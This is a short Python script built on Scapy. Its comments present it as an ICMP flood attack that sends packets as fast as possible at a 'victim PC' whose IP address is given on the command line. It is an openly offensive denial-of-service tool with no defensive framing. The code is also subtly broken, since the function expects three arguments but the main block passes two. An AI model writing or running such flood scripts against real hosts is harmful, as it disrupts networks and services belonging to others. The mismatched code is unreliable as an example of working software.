#Extra packages needed for this to run: Scapy.py
from datetime import datetime
from scapy.all import *





def ping(target_ip, targetedPort, duration):
    """
     Ping victim PC performing a ICMP Flood Attack
     The ICMP Flood Attack Aglortihm is based on sending packets 
     as fast as possible without waiting for the victim PCs response 
    """
    for _ in range(duration):
        ip = IP(dst=target_ip)
        icmp = ICMP()
        pkg = ip/icmp
        send(pkg, verbose=0)
        

if __name__ == "__main__":
    """Cmd args: targetIp, duration"""
    print("Preparing to ping victim PC")
    ping(sys.argv[1] , int(sys.argv[2]))
